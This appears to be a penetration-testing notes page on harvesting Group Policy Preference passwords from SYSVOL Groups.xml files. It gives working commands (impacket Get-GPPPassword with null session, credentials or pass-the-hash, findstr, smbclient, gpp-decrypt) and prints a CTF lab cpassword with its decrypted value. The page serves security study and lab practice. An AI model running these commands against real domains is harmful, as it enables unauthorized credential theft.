# GPP (Group Policy Preference) credential discovery

Group Policy Preferences (GPP) allowed administrators to create domain policies with embedded credentials. These policies allowed them to set local accounts, and embed credentials for various purposes that may otherwise require an embedded password in a script. So when a new Group Policy Preference (GPP) is generated, a xml file (generally Groups.xml) with the configuration data, including any passwords associated with the GPP, is created in the SYSVOL share which are folders on domain controllers accessible and readable to all authenticated domain users.

Group Policies for account management are stored on the Domain Controller in "Groups.xml" files buried in the SYSVOL folder.&#x20;

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

While some of these files may only contain something as simple as a configuration to rename an existing account, what we are interested in as pen testers are files that contain the "cpassword" field. These policies will actually set the password for the contained account. Below is a screenshot of one such file from the Domain Controller:

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

## Attacks&#x20;

### 1. Use impacket module to get the password.&#x20;

```bash
#with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

#with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

#pass the hash(with an NT hash)
Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

#parse a local file
Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
```

### 2. After accessing to the target machine, and find a xml file

```bash
CMD> findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml
```

After you find the password, decrypt the password.

```bash
Kali> gpp-decrypt <hash>
```

### 3. CTF: You may find SYSVOL files via any open ports

Maybe, you may find the Policies information that can be downloaded to a Kali machine.&#x20;

{% code overflow="wrap" %}
```bash
Kali> smbclient \\\\ip_address\\share
smb> mget * (to list all the files including policies)

Kali> grep password active.htb/* -r

# active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
	
# name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
```
{% endcode %}

### Decrypt the cpassword

{% code overflow="wrap" %}
```bash
Kali> gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

#GPPstillStandingStrong2k18
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
